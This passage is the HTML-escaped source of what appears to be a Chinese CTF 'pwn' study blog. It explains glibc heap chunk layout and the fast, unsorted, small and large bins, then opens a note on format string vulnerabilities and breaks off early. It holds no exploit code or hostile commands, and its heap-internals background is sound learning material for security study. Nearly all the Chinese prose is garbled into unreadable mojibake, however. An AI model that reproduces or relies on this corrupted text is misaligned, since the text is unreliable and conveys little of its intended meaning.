class=&#34;line&#34;&gt;        |             Forward pointer to next chunk in &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;             |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        |             Back pointer to previous chunk in &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;            |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        |             Unused &lt;span class=&#34;title function_&#34;&gt;space&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(may be &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; bytes &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)&lt;/span&gt;                .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        .                                                               .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; next   .                                                               |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chunk-&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;`foot:&amp;#x27; |             Size of chunk, in bytes                           |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        |             Size of next chunk, in bytes                |A|0|0|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;3тљёу▒╗binС╗Іу╗Ї&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3тљёу▒╗binС╗Іу╗Ї&#34;&gt;#&lt;/a&gt; 3. тљёу▒╗ bin С╗Іу╗Ї№╝џ&lt;/h2&gt;
&lt;p&gt;РђІ	chunk УбФжЄіТћЙТЌХ№╝їglibc С╝џт░єт«ЃС╗гжЄЇТќ░у╗ёу╗ЄУхиТЮЦ№╝їТъёТѕљСИЇтљїуџё bin жЊЙУАе№╝їтйЊућеТѕитєЇТгАућ│У»иТЌХ№╝їт░▒С╗јСИГт»╗ТЅЙтљѕжђѓуџё chunk У┐ћтЏъућеТѕисђѓСИЇтљїтцДт░Јтї║жЌ┤ chunk УбФтѕњтѕєтѕ░СИЇтљїуџё bin СИГ№╝їтєЇтіаСИіСИђуДЇуЅ╣Т«іуџё bin№╝їСИђтЁ▒ТюЅтЏЏуДЇ№╝џFast bin сђЂSamll bin сђЂ Large bin сђЂтњї Unsorted bin сђѓУ┐ЎС║Џ bin У«░тйЋтюе malloc_state у╗ЊТъёСИГсђѓ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fastbinsY №╝џУ┐ЎТў»СИђСИф bin ТЋ░у╗ё№╝їжЄїжЮбТюЅ NFASTBINS СИф fast binсђѓ&lt;/li&gt;
&lt;li&gt;bins№╝џС╣ЪТў»СИђСИф bin ТЋ░у╗ё№╝їСИђтЁ▒ТюЅ 126 СИф bin №╝їТїЅжА║т║ЈтѕєтѕФТў»№╝џ
&lt;ul&gt;
&lt;li&gt;bin 1 СИ║ unsorted bin&lt;/li&gt;
&lt;li&gt;bin 2 тѕ░ bin 63 СИ║ small bin&lt;/li&gt;
&lt;li&gt;bin 64 тѕ░ bin 126 СИ║ large bin&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;fast-bin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fast-bin&#34;&gt;#&lt;/a&gt; fast bin №╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	тюет«ъУихСИГ№╝їуеІт║Јућ│У»итњїжЄіТћЙуџётаєтЮЌтЙђтЙђжЃйТ»ћУЙЃт░Ј№╝їТЅђС╗Ц glibc т»╣У┐Ўу▒╗ bin Сй┐ућетЇЋжЊЙУАеу╗ЊТъё№╝їт╣ХжЄЄуће LIFO№╝ѕтљјУ┐ЏтЁѕтЄ║№╝ЅуџётѕєжЁЇуГќуЋЦсђѓСИ║С║єтіат┐ФжђЪт║д№╝їfast bin жЄїуџё chunk СИЇС╝џУ┐ЏУАїтљѕт╣ХТЊЇСйю№╝їТЅђС╗ЦСИІСИђСИф chunk уџё PRV_INUSE тДІу╗ѕТаЄУ«░СИ║ 1№╝їСй┐тЁХтцёС║јСй┐ућеуіХТђЂсђѓтљїСИђСИф fast bin жЄї chunk тцДт░ЈуЏИтљї№╝їт╣ХСИћтюе fastbinY ТЋ░у╗ёжЄїТїЅуЁДС╗јт░Јтѕ░тцДуџёжА║т║ЈТјњтѕЌ№╝їт║ЈтЈиСИ║ 0 уџё fast bin СИГт«╣у║│уџё chunk тцДт░ЈСИ║ 4&lt;em&gt;SIZE_SZ тГЌУіѓ№╝їжџЈуЮђт║ЈтЈитбътіа№╝їТЅђт«╣у║│уџё chunk жђњтбъ 2&lt;/em&gt;SIZE_SZ тГЌУіѓсђѓ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/08dc51489bb7469c8a03c0f73de586bb.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;unsorted-bin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unsorted-bin&#34;&gt;#&lt;/a&gt; unsorted bin№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	СИђт«џтцДт░Јуџё chunk УбФжЄіТћЙТЌХ№╝їтюеУ┐ЏтЁЦ small bin ТѕќУђЁ large bin С╣ІтЅЇ№╝їС╝џтЁѕтіатЁЦ unsorted bin сђѓтюет«ъУихСИГ№╝їСИђСИфжЄіТћЙуџё chunk тИИтИИтЙѕт┐Фт░▒С╝џУбФжЄЇТќ░Сй┐уће№╝їТЅђС╗Цт░єтЁХтЁѕтіатЁЦ unsorted bin тЈ»С╗Цтіат┐ФтѕєжЁЇуџёжђЪт║дсђѓ unsorted bin Сй┐ућетЈїжЊЙУАеу╗ЊТъё№╝їт╣ХжЄЄуће FIFO№╝ѕтЁѕУ┐ЏтЁѕтЄ║№╝ЅуџётѕєжЁЇуГќуЋЦсђѓСИј fastbinY СИЇтљї№╝їunsorted bin СИГуџё chunk тцДт░ЈтЈ»УЃйТў»СИЇтљїуџё№╝їт╣ХСИћућ▒С║јТў»тЈїтљЉжЊЙУАеу╗ЊТъё№╝їСИђСИф bin С╝џтЇауће bins уџёСИцСИфтЁЃу┤асђѓ&lt;/p&gt;
&lt;h3 id=&#34;small-bin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#small-bin&#34;&gt;#&lt;/a&gt; small bin№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	тљїСИђСИф small bin жЄї chunk уџётцДт░ЈуЏИтљї№╝їжЄЄућетЈїжЊЙУАеу╗ЊТъё№╝їСй┐ућежбЉујЄС╗ІС║ј fast bin тњї large bin С╣ІжЌ┤сђѓsmall bin тюе bins жЄїт▒Ёугг 2 тѕ░ 63 СйЇ№╝їтЁ▒ 62 СИфсђѓТа╣ТЇ«Тјњт║Ј№╝їТ»ЈСИф small bin уџётцДт░ЈСИ║ 2&lt;em&gt;SIZE_SZ&lt;/em&gt;inx№╝ѕidx УАеуц║ bins ТЋ░у╗ёуџёСИІТаЄ№╝Ѕсђѓтюе 64 СйЇу│╗у╗ЪСИІ№╝їТюђт░Јуџё small chunk СИ║ 2*8*2=32 тГЌУіѓ№╝їТюђтцДуџё small chunk СИ║ 2*8*63=1008 тГЌУіѓсђѓућ▒С║ј small bin тњї fast bin ТюЅжЄЇтљѕуџёжЃетѕє№╝їТЅђС╗ЦУ┐ЎС║Џ chunk тюеТЪљС║ЏТЃЁтєхСИІС╝џУбФтіатЁЦ small bin СИГсђѓ&lt;/p&gt;
&lt;h3 id=&#34;large-bin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#large-bin&#34;&gt;#&lt;/a&gt; large bin№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	large bin тюе bins жЄїт▒Ё 64 тѕ░ 126 СйЇ№╝їтЁ▒ 63 СИф№╝їУбФтѕєТѕљС║є 6 у╗ё№╝їТ»Ју╗ё bin ТЅђУЃйт«╣у║│уџё chunk ТїЅжА║т║ЈТјњТѕљуГЅти«ТЋ░тѕЌ№╝їтЁгти«тѕєтѕФтдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;32 bins of size			64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16 bins of size		   512&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 8 bins of size		  4096&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 4 bins of size		 32768&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 2 bins of size		262144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 1 bin  of size		what&amp;#x27;sleft&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	32 СйЇу│╗у╗ЪСИІуггСИђСИф large bin уџё chunk Тюђт░ЈСИ║ 512 тГЌУіѓ№╝їуггС║їСИф large bin уџёжбЮ chunk Тюђт░ЈСИ║ 512+64 тГЌУіѓ№╝ѕтцёС║ј [512№╝ї512+64] С╣ІжЌ┤уџё chunk жЃйт▒ъС║југгСИђСИф large bin№╝Ѕ№╝їС╗ЦТГцу▒╗Тјесђѓ64 СйЇу│╗у╗ЪС╣ЪТў»СИђТаиуџё№╝їуггСИђСИф large bin уџё chunk Тюђт░ЈСИ║ 1024 тГЌУіѓ№╝їуггС║їСИф large bin уџё chunk Тюђт░ЈСИ║ 1024+64 тГЌУіѓ№╝ѕтцёС║ј [1024№╝ї1024+64] С╣ІжЌ┤уџё chunk жЃйт▒ъС║југгСИђСИф large bin№╝ЅС╗ЦТГцу▒╗Тјесђѓ&lt;/p&gt;
&lt;p&gt;РђІ	large bin С╣ЪТў»жЄЄућетЈїжЊЙУАеу╗ЊТъё№╝їжЄїжЮбуџё chunk С╗јтц┤Уіѓуѓ╣уџё fd ТїЄжњѕт╝ђтДІ№╝їТїЅтцДт░ЈжА║т║ЈУ┐ЏУАїТјњтѕЌсђѓСИ║С║єтіат┐ФТБђу┤бжђЪт║д№╝їfd_nextsize тњї bk_nextsize ТїЄжњѕућеС║јТїЄтљЉуггСИђСИфСИјУЄфти▒тцДт░ЈСИЇтљїуџё chunk ТЌХ№╝їТЅђС╗ЦС╣ЪтЈфТюЅтюетіатЁЦС║єтцДт░ЈСИЇтљїуџё chunk ТЌХ№╝їУ┐ЎСИцСИфТїЄжњѕТЅЇС╝џУбФС┐«Тћ╣сђѓ&lt;/p&gt;
&lt;h2 id=&#34;тЈѓУђЃУхёТќЎ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#тЈѓУђЃУхёТќЎ&#34;&gt;#&lt;/a&gt; тЈѓУђЃУхёТќЎ№╝џ&lt;/h2&gt;
&lt;p&gt;РђІ	сђіCTF уФъУхЏТЮЃтеЂТїЄтЇЌ pwn у»ЄсђІ&lt;/p&gt;

 &lt;h1 id=&#34;pwnтГдС╣аугћУ«░5Та╝т╝ЈтїќтГЌугдСИ▓Т╝ЈТ┤ъ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwnтГдС╣аугћУ«░5Та╝т╝ЈтїќтГЌугдСИ▓Т╝ЈТ┤ъ&#34;&gt;#&lt;/a&gt; pwn тГдС╣аугћУ«░№╝ѕ5№╝ЅРђЊТа╝т╝ЈтїќтГЌугдСИ▓Т╝ЈТ┤ъ&lt;/h1&gt;
&lt;p&gt;РђІ	&lt;strong&gt;тЅЇУеђ№╝џућ▒С║јТЮАС╗ХТюЅжЎљ№╝їтЏаТГцт»╣С║јУ»ЦТ╝ЈТ┤ъуџётГдС╣аСИЇу«ЌтЙѕтцџ№╝ї&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;Та╝т╝ЈтїќтГЌугдСИ▓Т╝ЈТ┤ътЪ║уАђ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#Та╝т╝ЈтїќтГЌугдСИ▓Т╝ЈТ┤ътЪ║уАђ&#34;&gt;#&lt;/a&gt; Та╝т╝ЈтїќтГЌугдСИ▓Т╝ЈТ┤ътЪ║уАђ№╝џ&lt;/h2&gt;
&lt;h3 id=&#34;Та╝т╝ЈтїќтГЌугдСИ▓С╗Іу╗Ї&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#Та╝т╝ЈтїќтГЌугдСИ▓С╗Іу╗Ї&#34;&gt;#&lt;/a&gt; Та╝т╝ЈтїќтГЌугдСИ▓С╗Іу╗Ї№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	Та╝т╝ЈтїќтГЌугдСИ▓тЄйТЋ░тЈ»С╗ЦТјЦТћХтЈ»тЈўТЋ░жЄЈуџётЈѓТЋ░№╝їт╣Хт░є&lt;strong&gt;уггСИђСИфтЈѓТЋ░СйюСИ║Та╝т╝ЈтїќтГЌугдСИ▓№╝їТа╣ТЇ«тЁХТЮЦУДБТъљС╣ІтљјуџётЈѓТЋ░&lt;/strong&gt;№╝їТа╝т╝ЈтїќтГЌугдСИ▓уџётѕЕућеСИђУѕгтѕєСИ║СИЅСИфжЃетѕє№╝џ&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Та╝т╝ЈтїќтГЌугдСИ▓тЄйТЋ░&lt;/li&gt;
&lt;li&gt;Та╝т╝ЈтїќтГЌугдСИ▓&lt;/li&gt;
